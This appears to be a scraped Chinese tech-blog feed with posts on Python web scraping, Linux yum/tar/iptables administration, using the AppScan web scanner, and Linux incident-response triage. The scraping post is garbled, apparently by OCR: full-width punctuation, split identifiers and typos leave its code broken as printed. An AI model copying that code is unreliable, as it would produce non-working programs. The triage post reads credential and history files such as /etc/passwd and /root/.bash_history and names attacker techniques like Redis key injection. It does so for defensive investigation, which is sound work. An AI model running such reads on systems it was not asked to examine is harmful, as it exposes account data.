title="正则表达式"></a>正则表达式</h4><p>当我们使用正则表达式抓取面积数据 时 ， 首 先需要尝试匹配＜td&gt;元素中的内容 ， 如下所 示</p><p>import re</p><p>url ＝ ‘<a href="http://example" target="_blank" rel="noopener">http://example</a> . webscraping.com/places/view/United Kingdom239’</p><p>html = download (url )</p><p>re.findall （ ’＜ td class＝”w2p fw ” ＞ ( . * ? ) &lt;/td＞ ’ ， html )</p><p>从上述结果 中 可 以看 出 ， 多个国 家属性都使用 了＜td c l a s s = “ w2p fw “ &gt;标签 。 要想分离出 面积属性 ，我们可以只选择其中的第二个元素</p><p>re .findall （ ’ ＜td c l a s s ＝ ” w2p fw ” ＞ （.*?） ＜ ／ td＞ ’ ， html ) [ 1 ]</p><p>虽然现在可以使用 这个方案 ， 但是如果网页发生变化 ， 该方案很可能就会失效</p><h4 id="Beautiful-Soup"><a href="#Beautiful-Soup" class="headerlink" title="Beautiful Soup"></a>Beautiful Soup</h4><p>Beautiful Soup 是一个非常流行 的 Pyhon 模块 。 该模块可以解析网 页 ， 并提供定位内容的便捷接口 。 如果你还没有安装该模块 ， 可 以使用下面的命令安装其最新版本 ：</p><p>pip install   beautifulsoup4</p><p>使用 Beautifl Soup 的第一步是将 己下 载 的 HTML 内 容解析为 soup 文档</p><p>from bs4 import  BeautifulSoup</p><p> html ＝ ’ ＜u l c l a s s =country&gt;&lt; l i &gt;Area&lt; l i &gt; Population&lt; /ul＞ ’</p><p>soup = BeautifulSoup （html ， ’ html .parser’ ）</p><p>BeautifulSoup 能够正确解析缺失 的引号并闭合标签, 现在可 以使用find()和find_all()方法来定位需要的元素了</p><p>u l = soup.find（ ’ ul ’ ， attrs＝ ｛ ’ class ’ ： ’ country ’ ｝ ）</p><p>ul.find（’ l i ’）  # 只匹配第一个符合的</p><p>ul.find_all（’ l i ’）  # 匹配所有符合的</p><p>使用该方法抽取示例国家面积数据的完整代码 </p><p>from bs4 import Beautiful Soup<br> url ＝ ‘<a href="http://example" target="_blank" rel="noopener">http://example</a> . webscraping.com/places/view/United Kingdom239’<br> html = download (url )<br>soup = Beautifulsoup(html)</p><p> tr = soup.find ( attrs＝｛ ‘id’: ‘places_area_row ’｝）<br> td = tr.find (attrs ＝ ｛ ’ cl a s s ’ ： ’ w2p_fw ’))      # locate the area tag<br> area = td.text                            # extract the text from this tag<br> print area<br>244,82 0 quare kilometres</p><h4 id="Lxml"><a href="#Lxml" class="headerlink" title="Lxml"></a>Lxml</h4><p>Lxml 是基于libxml 2这一 XML 解析库的Python封装 。 该模块使用C语言编写 ， 解析速度比Beautifl Soup更快，不过安装过程也更为复杂</p><p>和 Beautifl Soup 一样 ， 使用 lxml 模块 的第一步也是将有可能不合法 的HTML 解析为 统一格式,同样地, lxml 也可以正确解析属性两侧缺失的引号,并闭合标签</p><p>解析完输入 内 容之后 ， 进入选择元素 的步骤 ， 此 时 l xml 有几种不 同 的方法 ， 比如 XPath 选择器和Beautifl Soup 的find()方法.  我们将会使用 css 选择器 ， 因 为它更加 简 沽</p><p>使用lxml 的 css 选择器抽取面积数据 的 示例</p><p>import   lxml.html</p><p>tree = lxml.html.fromstring(html )</p><p>td = tree.cssselect ( ’ tr#places_area_r。w &gt; td . w2p_fw ’) [0]</p><p>area = td.text content()</p><p>print area</p><p>这段代码首先会找 到 ID 为place s area row 的表格行元素 ， 然后选择class为 w2pfw 的表格数据子标签</p><h5 id="css-选择器"><a href="#css-选择器" class="headerlink" title="css 选择器"></a>css 选择器</h5><p>css 选择器表示选择元素所使用的模式</p><p>选择所 有标签 ： ＊<br>选择＜a＞标 签： a<br>选择所有 cla s s ＝ ”lin k ” 的 元 素 ： .lin k<br>选择 cla s s ＝ ”link ” 的 ＜a＞标 签： a.link<br>选择 id= “ home ” 的 ＜a＞标 签： a #home<br>选择父 元 素 为 ＜a＞标 签 的 所 有 ＜ span＞子标 签： a &gt; span<br>选择＜a＞标签 内 部 的 所 有 &lt; span＞标签： a  span<br>选择 title 属 性 为 ” Home ” 的 所 有＜a＞标 签： a [ title=Home ]</p><p>lxml在内部实现 中 ， 实 际 是将 css 选择器转换为等价的 XPath 选择器</p><h4 id="性能对比"><a href="#性能对比" class="headerlink" title="性能对比"></a>性能对比</h4><p>每种抓取方法 的优缺点:</p><p>抓取方法                    性能          使用难度               安装难度<br>正则表达式                  快              困难                     简单 （ 内 置模块 ）<br>Beautifl Soup             慢              简单                      简单 （ 纯 P归hon )<br>Lxml                            快              简单                      相对困难</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>运维知识</title>
    <link href="http://yoursite.com/2018/08/25/%E8%BF%90%E7%BB%B4%E7%9F%A5%E8%AF%86/"/>
    <id>http://yoursite.com/2018/08/25/运维知识/</id>
    <published>2018-08-25T14:39:05.000Z</published>
    <updated>2018-08-28T04:02:06.184Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-173.png" alt="upload successful"></p><h2 id="配置本地yum源"><a href="#配置本地yum源" class="headerlink" title="配置本地yum源"></a>配置本地yum源</h2><p>vim /etc/yum.repos.d/rhel7.repo</p><p>[rhel7]</p><p>name=rhel7</p><p>baseurl=file:///media/cdrom</p><p>enabled=1</p><p>gpgcheck=0</p><p>创建挂载点进行挂载，设置开机自动挂载。</p><p>mkdir -p /media/cdrom</p><p>mount /dev/cdrom /media/cdrom</p><p>挂载本地iso文件</p><p> 1.上传iso文件到/opt  </p><p>2.创建挂载目录</p><p>mkdir /media/CentOS7</p><p>3.挂载iso文件</p><p>mount -t iso9660 -o loop /opt/CentOS-7-x86_64-DVD-1511_7.2.iso /media/CentOS7/</p><p>4.配置源</p><p>执行 vi /etc/yum.repos.d/CentOS7-Localsource.repo #打开repo文件，如果这一文件不存在则被创建<br>按a 进入编辑模式<br>输入以下内容：<br>[CentOS7-Localsource]<br>name=CentOS7<br>baseurl=file:///media/CentOS7<br>enabled=1<br>gpgcheck=0</p><p>按ESC退出编辑 输入 :x 再回车 保存后退出</p><p>5.将此文件/etc/yum.repos.d/CentOS-Base.repo备份掉，或者移动到别的目录下</p><p>6.生成本地yum缓存 执行</p><p>yum  clean all(清除缓存)</p><p>yum makecache(建立新缓存)</p><p>7.测试是否生效</p><p>yum install telnet</p><p>8.卸载挂载的镜像文件</p><p>umount  /media/CentOS7</p><h2 id="Linux下打包和解压缩"><a href="#Linux下打包和解压缩" class="headerlink" title="Linux下打包和解压缩"></a>Linux下打包和解压缩</h2><h4 id="各种解压缩命令"><a href="#各种解压缩命令" class="headerlink" title="各种解压缩命令"></a>各种解压缩命令</h4><p>.tar<br>压缩：tar cvf FileName.tar FileName</p><p>解压：tar xvf FileName.tar</p><p>.gz<br>解压1：gunzip FileName.gz<br>解压2：gzip -d FileName.gz<br>压缩：gzip FileName </p><p>.tar.gz<br>解压：tar zxvf FileName.tar.gz </p><p>压缩：tar zcvf FileName.tar.gz DirName </p><p>.bz2<br>解压1：bzip2 -d FileName.bz2<br>解压2：bunzip2 FileName.bz2<br>压缩： bzip2 -z FileName </p><p>.tar.bz2<br>解压：tar jxvf FileName.tar.bz2 </p><p>压缩：tar jcvf FileName.tar.bz2 DirName </p><p>.bz<br>解压1：bzip2 -d FileName.bz<br>解压2：bunzip2 FileName.bz<br>压缩：未知 </p><p>.tar.bz<br>解压：tar jxvf FileName.tar.bz </p><p>压缩：未知 </p><p>.Z<br>解压：uncompress FileName.Z<br>压缩：compress FileName </p><p>.tar.Z<br>解压：tar Zxvf FileName.tar.Z </p><p>压缩：tar Zcvf FileName.tar.Z DirName </p><p>.tgz<br>解压：tar zxvf FileName.tgz<br>压缩：未知 </p><p>.tar.tgz<br>解压：tar zxvf FileName.tar.tgz </p><p>压缩：tar zcvf FileName.tar.tgz FileName </p><p>.zip<br>解压：unzip FileName.zip </p><p>压缩：zip FileName.zip DirName </p><p>.rar<br>解压：rar a FileName.rar<br>压缩：rar e FileName.rar </p><h4 id="不同后缀的含义："><a href="#不同后缀的含义：" class="headerlink" title="不同后缀的含义："></a>不同后缀的含义：</h4><pre><code>.tar打包格式：tar程序打包的数据，并没有压缩过.z格式：compress程序压缩的文件.gz压缩格式：gzip程序压缩的文件 .bz2压缩格式：bzip2程序压缩的文件.tar.gz打包压缩：tar程序打包的文件，其中并且经过 gzip 的压缩.tar.bz2打包压缩：tar程序打包的文件，其中并且经过 bzip2 的压缩</code></pre><h2 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h2><p>CentOS7默认的防火墙不是iptables,而是firewalld.<br>安装iptable iptable-service</p><h5 id="先检查是否安装了iptables"><a href="#先检查是否安装了iptables" class="headerlink" title="#先检查是否安装了iptables"></a>#先检查是否安装了iptables</h5><p>service iptables status</p><p>#安装iptables<br>yum install -y iptables</p><p>#升级iptables<br>yum update iptables </p><p>#安装iptables-services<br>yum install iptables-services</p><h5 id="禁用-停止自带的firewalld服务"><a href="#禁用-停止自带的firewalld服务" class="headerlink" title="禁用/停止自带的firewalld服务"></a>禁用/停止自带的firewalld服务</h5><p>#停止firewalld服务<br>systemctl stop firewalld</p><p>#禁用firewalld服务<br>systemctl mask firewalld<br>设置现有规则</p><h5 id="查看iptables现有规则"><a href="#查看iptables现有规则" class="headerlink" title="#查看iptables现有规则"></a>#查看iptables现有规则</h5><p>iptables -L -n</p><p>#先允许所有,不然有可能会杯具<br>iptables -P INPUT ACCEPT</p><p>#清空所有默认规则<br>iptables -F</p><p>#清空所有自定义规则<br>iptables -X</p><p>#所有计数器归0<br>iptables -Z</p><p>#允许来自于lo接口的数据包(本地访问)<br>iptables -A INPUT -i lo -j ACCEPT</p><h5 id="开放22端口"><a href="#开放22端口" class="headerlink" title="#开放22端口"></a>#开放22端口</h5><p>iptables -A INPUT -p tcp –dport 22 -j ACCEPT</p><p>#开放21端口(FTP)<br>iptables -A INPUT -p tcp –dport 21 -j ACCEPT</p><p>#开放80端口(HTTP)<br>iptables -A INPUT -p tcp –dport 80 -j ACCEPT</p><p>#开放443端口(HTTPS)<br>iptables -A INPUT -p tcp –dport 443 -j ACCEPT</p><p>#允许ping<br>iptables -A INPUT -p icmp –icmp-type 8 -j ACCEPT</p><p>#允许接受本机请求之后的返回数据 RELATED,是为FTP设置的<br>iptables -A INPUT -m state –state  RELATED,ESTABLISHED -j ACCEPT</p><p>#其他入站一律丢弃<br>iptables -P INPUT DROP</p><p>#所有出站一律绿灯<br>iptables -P OUTPUT ACCEPT</p><p>#所有转发一律丢弃<br>iptables -P FORWARD DROP</p><h5 id="其他规则设定"><a href="#其他规则设定" class="headerlink" title="其他规则设定"></a>其他规则设定</h5><p>#如果要添加内网ip信任（接受其所有TCP请求）<br>iptables -A INPUT -p tcp -s 45.96.174.68 -j ACCEPT</p><p>#过滤所有非以上规则的请求<br>iptables -P INPUT DROP</p><p>#要封停一个IP，使用下面这条命令：<br>iptables -I INPUT -s <strong><em>.</em></strong>.<strong><em>.</em></strong> -j DROP</p><p>#要解封一个IP，使用下面这条命令:<br>iptables -D INPUT -s <strong><em>.</em></strong>.<strong><em>.</em></strong> -j DROP</p><h5 id="保存规则设定"><a href="#保存规则设定" class="headerlink" title="保存规则设定"></a>保存规则设定</h5><p>#保存上述规则<br>service iptables save<br>开启iptables服务 </p><p>##### </p><h5 id="注册iptables服务"><a href="#注册iptables服务" class="headerlink" title="#注册iptables服务"></a>#注册iptables服务</h5><p>#相当于以前的chkconfig iptables on<br>systemctl enable iptables.service</p><p>#开启服务<br>systemctl start iptables.service</p><p>#查看状态<br>systemctl status iptables.service</p><p>解决vsftpd在iptables开启后,无法使用被动模式的问题<br>1.首先在/etc/sysconfig/iptables-config中修改或者添加以下内容</p><p>#添加以下内容,注意顺序不能调换<br>IPTABLES_MODULES=”ip_conntrack_ftp”<br>IPTABLES_MODULES=”ip_nat_ftp”<br>2.重新设置iptables设置<br>iptables -A INPUT -m state –state  RELATED,ESTABLISHED -j ACCEPT</p><h5 id="以下为完整设置脚本"><a href="#以下为完整设置脚本" class="headerlink" title="以下为完整设置脚本"></a>以下为完整设置脚本</h5><p>#!/bin/sh<br>iptables -P INPUT ACCEPT<br>iptables -F<br>iptables -X<br>iptables -Z<br>iptables -A INPUT -i lo -j ACCEPT<br>iptables -A INPUT -p tcp –dport 22 -j ACCEPT<br>iptables -A INPUT -p tcp –dport 21 -j ACCEPT<br>iptables -A INPUT -p tcp –dport 80 -j ACCEPT<br>iptables -A INPUT -p tcp –dport 443 -j ACCEPT<br>iptables -A INPUT -p icmp –icmp-type 8 -j ACCEPT<br>iptables -A INPUT -m state –state RELATED,ESTABLISHED -j ACCEPT<br>iptables -P INPUT DROP<br>iptables -P OUTPUT ACCEPT<br>iptables -P FORWARD DROP<br>service iptables save<br>systemctl restart iptables.service</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="运维" scheme="http://yoursite.com/categories/%E8%BF%90%E7%BB%B4/"/>
    
    
      <category term="运维" scheme="http://yoursite.com/tags/%E8%BF%90%E7%BB%B4/"/>
    
  </entry>
  
  <entry>
    <title>Appscan使用指北</title>
    <link href="http://yoursite.com/2018/08/23/Appscan%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8C%97/"/>
    <id>http://yoursite.com/2018/08/23/Appscan使用指北/</id>
    <published>2018-08-23T13:45:05.000Z</published>
    <updated>2018-08-23T15:18:31.684Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-115.png" alt="upload successful"></p><h2 id="关于Appscan"><a href="#关于Appscan" class="headerlink" title="关于Appscan"></a>关于Appscan</h2><p>Rational AppScan（简称 AppScan）其实是一个产品家族，包括众多的应用安全扫描产品，从开发阶段的源代码扫描的 AppScan  source edition，到针对 Web 应用进行快速扫描的 AppScan    standard edition，以及进行安全管理和汇总整合的 AppScan     enterprise Edition 等。我们经常说的 AppScan 就是指的桌面版本的AppScan，即 AppScan standard edition。其安装在Windows 操作系统上，可以对网站等 Web 应用进行自动化的应用安全扫描和测试</p><h2 id="AppScan工作原理"><a href="#AppScan工作原理" class="headerlink" title="AppScan工作原理"></a>AppScan工作原理</h2><p><img src="\images\pasted-117.png" alt="upload successful"></p><p>1.通过搜索（爬行）发现整个 Web 应用结构</p><p>2.根据分析，发送修改的 HTTP Request 进行攻击尝试（扫描规则库）</p><p>3.通过对于 Respone 的分析验证是否存在安全漏洞</p><h4 id="扫描原理"><a href="#扫描原理" class="headerlink" title="扫描原理"></a>扫描原理</h4><p>扫描规则库 + 爬行 + 测试</p><p><img src="\images\pasted-116.png" alt="upload successful"></p><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><h4 id="常规扫描"><a href="#常规扫描" class="headerlink" title="常规扫描"></a>常规扫描</h4><p>下一步——下一步。。</p><p>1.打开 AppScan.exe 选择 文件</p><p>2.选择常规扫描（扫描规则自己可以定义后面详细说明）下一步</p><p><img src="\images\pasted-119.png" alt="upload successful"></p><p>3.输入你要扫描的起始 url，然后下一步</p><h4 id="登录扫描"><a href="#登录扫描" class="headerlink" title="登录扫描"></a>登录扫描</h4><p>如果选择记录此项后,会出现一个新的浏览器，并尝试链接到指定的网站作为本扫描的起始 URL.你需要输入账号和密码登陆到应用程序.这样设置之后你可以关闭浏览器，但是不要点击注销按钮.</p><p>更改浏览器：Tools–&gt;Options –&gt;Advanced  OpenIEBrower 的值 0–Appscan浏览器,1–IE,2–Firefox,3–Chrome.<br>如果选择提示，每次注销之后,Appscan 会提示你登陆到应用程序中.如果你打算整个扫描你的系统，你可以选择这个选项</p><p><img src="\images\pasted-118.png" alt="upload successful"><br>如果遇到没有验证码的登录页面可以选择自动选择下一步</p><h4 id="测试策略"><a href="#测试策略" class="headerlink" title="测试策略"></a>测试策略</h4><p>根据你的测试策略,你需要选择最适合你需求的策略,现有的策略都是默认（缺省）的</p><p><img src="\images\pasted-120.png" alt="upload successful"><br>这是开始扫描的最后一步.IBM Rational Appscan 允许你选择你想要的扫描方式，即完成扫描,探索扫描等</p><p><img src="\images\pasted-121.png" alt="upload successful"></p><h2 id="AppScan-简单配置"><a href="#AppScan-简单配置" class="headerlink" title="AppScan-简单配置"></a>AppScan-简单配置</h2><h4 id="配置面板"><a href="#配置面板" class="headerlink" title="配置面板"></a>配置面板</h4><p>点击 appscan 的配置选项即可打开配置面板，里面的参数可以根据自己实际情况修改</p><p><img src="\images\pasted-122.png" alt="upload successful"></p><h4 id="排除文件路径"><a href="#排除文件路径" class="headerlink" title="排除文件路径"></a>排除文件路径</h4><p><img src="\images\pasted-123.png" alt="upload successful"></p><h4 id="探索选项"><a href="#探索选项" class="headerlink" title="探索选项"></a>探索选项</h4><p><img src="\images\pasted-124.png" alt="upload successful"></p><h4 id="错误页面"><a href="#错误页面" class="headerlink" title="错误页面"></a>错误页面</h4><p><img src="\images\pasted-125.png" alt="upload successful"></p><h4 id="扫描策略"><a href="#扫描策略" class="headerlink" title="扫描策略"></a>扫描策略</h4><p>可以根据网站条件修改 为加快网站扫描速度 可以去掉不重要的漏洞扫描</p><h4 id="配置总结"><a href="#配置总结" class="headerlink" title="配置总结"></a>配置总结</h4><p>对于大型的网站，我们可以从几个方面来优化配置：</p><p>1.选择合适的，最小化的扫描规则</p><p>2.分解扫描任务，把一个大的扫描任务分解为多个小的扫描任务</p><p>3.根据页面特点，设置可以过滤的类似页面（冗余页面）</p><h2 id="扩展工具"><a href="#扩展工具" class="headerlink" title="扩展工具"></a>扩展工具</h2><p><img src="\images\pasted-126.png" alt="upload successful"></p><p>表单破解</p><p><img src="\images\pasted-127.png" alt="upload successful"><br>链接测试</p><p><img src="\images\pasted-128.png" alt="upload successful"><br>编码转换</p><p><img src="\images\pasted-129.png" alt="upload successful"><br>正则测试、</p><p><img src="\images\pasted-130.png" alt="upload successful"><br>发包测试</p><p><img src="\images\pasted-131.png" alt="upload successful"><br>会话令牌分析</p><p><img src="\images\pasted-132.png" alt="upload successful"></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="安全工具" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="安全工具" scheme="http://yoursite.com/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>应急响应手工杀马</title>
    <link href="http://yoursite.com/2018/08/22/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%89%8B%E5%B7%A5%E6%9D%80%E9%A9%AC/"/>
    <id>http://yoursite.com/2018/08/22/应急响应手工杀马/</id>
    <published>2018-08-22T07:05:42.000Z</published>
    <updated>2018-08-22T12:25:41.450Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-113.png" alt="upload successful"></p><h1 id="一-什么是应急响应"><a href="#一-什么是应急响应" class="headerlink" title="一.什么是应急响应"></a>一.什么是应急响应</h1><p>应急响应的目的:恢复系统的CIA</p><h3 id="应急响应6个阶段："><a href="#应急响应6个阶段：" class="headerlink" title="应急响应6个阶段："></a>应急响应6个阶段：</h3><p>pdcerf</p><p>准备、检测、遏制、根除、恢复、跟踪</p><h3 id="安全事件分类："><a href="#安全事件分类：" class="headerlink" title="安全事件分类："></a>安全事件分类：</h3><p>1.Web入侵：挂马、篡改、Webshell，僵  木  蠕  等有害程序</p><p>2.网络攻击类 : DOS   DDOS  扫描</p><p>3.信息破坏类：网站内容篡改、假冒信息，脱裤、数据库登录（弱口令）</p><p>4.信息内容安全：不良言论</p><p>5.设备的软硬件故障</p><p>6.自然灾害</p><p>7.系统入侵：系统异常、RDP爆破、SSH爆破、主机漏洞</p><h3 id="事件分级（四级）"><a href="#事件分级（四级）" class="headerlink" title="事件分级（四级）:"></a>事件分级（四级）:</h3><p>原则：根据信息系统的危害程度，信息系统的重要性、以及对社会的影响等</p><p>1.特大</p><p>2.重大</p><p>3.严重</p><p>4.一般</p><h1 id="二-排查思路"><a href="#二-排查思路" class="headerlink" title="二.排查思路"></a>二.排查思路</h1><p>一个常规的入侵事件后的系统排查思路：</p><p><img src="\images\pasted-110.png" alt="upload successful"></p><h3 id="1-文件分析"><a href="#1-文件分析" class="headerlink" title="1.文件分析"></a>1.文件分析</h3><p>文件日期、新增文件、可疑/异常文件、最近使用文件、浏览器下载文件</p><p>webshell排查分析</p><p>核心应用关联目录文件分析</p><h3 id="2-进程分析"><a href="#2-进程分析" class="headerlink" title="2.进程分析"></a>2.进程分析</h3><p>当前活动进程 &amp; 远程连接 </p><p>启动进程 &amp; 计划任务</p><p>进程工具分析:    windows：Pchunter</p><pre><code>linux:  Chkrootkit&amp;Rkhunter</code></pre><h3 id="3-系统信息"><a href="#3-系统信息" class="headerlink" title="3.系统信息"></a>3.系统信息</h3><p>系统变量</p><p>环境变量</p><p>history</p><p>系统配置文件</p><h3 id="4-日志分析"><a href="#4-日志分析" class="headerlink" title="4.日志分析"></a>4.日志分析</h3><p>操作系统日志</p><p>windows事件查看器(eventvwr),  linux( /var/log)</p><p>应用日志分析: access.log     Error.log</p><h1 id="三-分析排查"><a href="#三-分析排查" class="headerlink" title="三.分析排查"></a>三.分析排查</h1><h2 id="Linux分析排查"><a href="#Linux分析排查" class="headerlink" title="Linux分析排查"></a>Linux分析排查</h2><h3 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h3><h5 id="敏感目录的文件分析（类-tmp目录，命令目录-usr-bin-usr-sbin）"><a href="#敏感目录的文件分析（类-tmp目录，命令目录-usr-bin-usr-sbin）" class="headerlink" title="敏感目录的文件分析（类/tmp目录，命令目录/usr/bin /usr/sbin）"></a>敏感目录的文件分析（类/tmp目录，命令目录/usr/bin /usr/sbin）</h5><p> 例如: 查看tmp目录下的文件： <code>ls –alt /tmp/</code></p><p>查看开机启动项内容：<code>ls -alt /etc/init.d/</code></p><p>查看指定目录下文件时间的排序：<code>ls -alt | head -n 10</code></p><p>针对可疑文件可以使用stat进行创建修改时间、访问时间的详细查看，若修改时间距离事件日期接近，有线性关联，说明可能被篡改。</p><h5 id="新增文件分析"><a href="#新增文件分析" class="headerlink" title="新增文件分析"></a>新增文件分析</h5><p>例如要查找24小时内被修改的文件：</p><p><code>find   ./  -mtime 0 -name “文件名”</code> （最后一次修改发生在距离当前时间n24小时至(n+1)24 小时）</p><p>查找72小时内新增的文件 : <code>find / -ctime -2</code>      -ctime 内容未改变权限改变时候也可以查出</p><p>根据确定时间去反推变更的文件：  <code>ls -al /tmp | grep &quot;Feb 27&quot;</code></p><h5 id="特殊权限的文件"><a href="#特殊权限的文件" class="headerlink" title="特殊权限的文件 "></a>特殊权限的文件 </h5><p>查找777的权限的文件 <code>find  / *.jsp   -perm 4777</code></p><h5 id="隐藏的文件"><a href="#隐藏的文件" class="headerlink" title="隐藏的文件"></a>隐藏的文件</h5><p>（以 “.”开头的具有隐藏属性的文件）</p><p>在文件分析过程中，手工排查频率较高的命令是 find   grep     ls 核心目的是为了关联推理出可疑文件。</p><p>进程分析</p><h5 id="使用netstat-网络连接命令"><a href="#使用netstat-网络连接命令" class="headerlink" title="使用netstat 网络连接命令"></a>使用netstat 网络连接命令</h5><p>分析可疑端口、可疑IP、可疑PID及程序进程  <code>netstat   –antlp | more</code></p><h5 id="使用ps命令，分析进程"><a href="#使用ps命令，分析进程" class="headerlink" title="使用ps命令，分析进程"></a>使用ps命令，分析进程</h5><p><code>ps aux | grep pid | grep –v grep</code></p><h5 id="查看指定端口对应的程序"><a href="#查看指定端口对应的程序" class="headerlink" title="查看指定端口对应的程序"></a>查看指定端口对应的程序</h5><p>使用<code>lsof -i:1677</code></p><h5 id="使用ls-以及-stat-查看系统命令是否被替换"><a href="#使用ls-以及-stat-查看系统命令是否被替换" class="headerlink" title="使用ls 以及 stat 查看系统命令是否被替换"></a>使用ls 以及 stat 查看系统命令是否被替换</h5><p> 两种思路：</p><p>第一种查看命令目录最近的时间排序</p><p>第二种根据确定时间去匹配。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> ls -alt /usr/bin | head -10 ls -al /bin /usr/bin /usr/sbin/ /sbin/ | grep &quot;Jan 15&quot;</span><br></pre></td></tr></table></figure></p><h5 id="隐藏进程查看"><a href="#隐藏进程查看" class="headerlink" title="隐藏进程查看"></a>隐藏进程查看</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | awk &apos;&#123;print&#125;&apos; | sort -n | uniq &gt;1</span><br><span class="line">ls /proc | sort -n |uniq &gt;2</span><br><span class="line">diff 1 2</span><br></pre></td></tr></table></figure><h5 id="查看分析任务计划"><a href="#查看分析任务计划" class="headerlink" title="查看分析任务计划"></a>查看分析任务计划</h5><p> a.通过<code>crontabl –l</code> 查看当前的任务计划有哪些，是否有后门木马程序启动相关信息；</p><p> b.查看etc目录任务计划相关文件，<code>ls /etc/cron*</code></p><h3 id="系统信息"><a href="#系统信息" class="headerlink" title="系统信息"></a>系统信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">history (cat /root/.bash_history)</span><br><span class="line">/etc/passwd</span><br><span class="line">crontab  /etc/cron*</span><br><span class="line">rc.local  /etc/init.d chkconfig</span><br><span class="line">last</span><br><span class="line">$PATH</span><br><span class="line">strings</span><br></pre></td></tr></table></figure><h5 id="查看分析history-cat-root-bash-history"><a href="#查看分析history-cat-root-bash-history" class="headerlink" title="查看分析history (cat /root/.bash_history)"></a>查看分析history (cat /root/.bash_history)</h5><p>曾经的命令操作痕迹，以便进一步排查溯源。有可能通过记录关联到如下信息：</p><p>a.wget 远程某主机（域名&amp;IP）的远控文件；</p><p> b.尝试连接内网某主机（ssh scp），便于分析攻击者意图; </p><p>c.打包某敏感数据或代码，tar zip 类命令 </p><p>d.对系统进行配置，包括命令修改、远控木马类，可找到攻击者关联信息…</p><h5 id="查看分析用户相关分析"><a href="#查看分析用户相关分析" class="headerlink" title="查看分析用户相关分析"></a>查看分析用户相关分析</h5><p>a. <code>useradd userdel</code> 的命令时间变化（stat），以及是否包含可疑信息</p><p> b. <code>cat /etc/passwd</code> 分析可疑帐号，可登录帐号 查看UID为0的帐号：</p><pre><code> `awk  -F: &apos;{if($3==0)print $1}&apos; /etc/passwd `</code></pre><p>c. 查看能够登录的帐号：</p><pre><code>  `cat /etc/passwd | grep -E &quot;/bin/bash$&quot; `</code></pre><p>PS：UID为0的帐号也不一定都是可疑帐号，Freebsd默认存在toor帐号，且uid为0.（toor 在BSD官网解释为root替代帐号，属于可信帐号）</p><h5 id="查看linux-开机启动程序"><a href="#查看linux-开机启动程序" class="headerlink" title="查看linux 开机启动程序"></a>查看linux 开机启动程序</h5><p>a.  <code>查看rc.local文件（/etc/init.d/rc.local /etc/rc.local）</code></p><p> b.  <code>ls –alt /etc/init.d/ c) chkconfig</code></p><h5 id="查看系统用户登录信息"><a href="#查看系统用户登录信息" class="headerlink" title="查看系统用户登录信息 "></a>查看系统用户登录信息 </h5><p>a.  使用lastlog命令，系统中所有用户最近一次登录信息。</p><p> b.  使用lastb命令，用于显示用户错误的登录列表 c) 使用last命令，用于显示用户最近登录信息（数据源为/var/log/wtmp，var/log/btmp） utmp文件中保存的是当前正在本系统中的用户的信息。 wtmp文件中保存的是登录过本系统的用户的信息。 /var/log/wtmp 文件结构和/var/run/utmp 文件结构一样，都是引用/usr/include/bits/utmp.h 中的struct utmp</p><h5 id="系统路径分析"><a href="#系统路径分析" class="headerlink" title="系统路径分析"></a>系统路径分析</h5><p><code>echo $PATH</code>分析有无敏感可疑信息</p><h5 id="指定信息检索"><a href="#指定信息检索" class="headerlink" title="指定信息检索 "></a>指定信息检索 </h5><p>a.  strings命令在对象文件或二进制文件中查找可打印的字符串 </p><p>b.  分析sshd 文件，是否包括IP信息</p><h5 id="查看ssh相关目录有无可疑的公钥存在"><a href="#查看ssh相关目录有无可疑的公钥存在" class="headerlink" title="查看ssh相关目录有无可疑的公钥存在"></a>查看ssh相关目录有无可疑的公钥存在</h5><p> a.   Redis（6379） 未授权恶意入侵，即可直接通过redis到目标主机导入公钥。 </p><p>b.   目录： /etc/ssh ./.ssh/</p><h3 id="后门排查"><a href="#后门排查" class="headerlink" title="后门排查"></a>后门排查</h3><p>推荐工具：<br>chkrootkit       rkhunter（<a href="http://www.chkrootkit.org" target="_blank" rel="noopener">www.chkrootkit.org</a> rkhunter.sourceforge.net）</p><h5 id="chkrootkit"><a href="#chkrootkit" class="headerlink" title="chkrootkit"></a>chkrootkit</h5><p>(迭代更新了20年)主要功能：<br>1    检测是否被植入后门、木马、rootkit<br>2    检测系统命令是否正常<br>3    检测登录日志<br>4    详细参考README</p><h5 id="rkhunter："><a href="#rkhunter：" class="headerlink" title="rkhunter："></a>rkhunter：</h5><p>1    系统命令（Binary）检测，包括Md5 校验<br>2    Rootkit检测<br>3    本机敏感目录、系统配置、服务及套间异常检测<br>4    三方应用版本检测</p><h5 id="Webshell查找"><a href="#Webshell查找" class="headerlink" title="Webshell查找"></a>Webshell查找</h5><p>Github上存在各种版本的webshell查杀脚本</p><p>通过chkrootkit 、rkhunter、Webshell Check 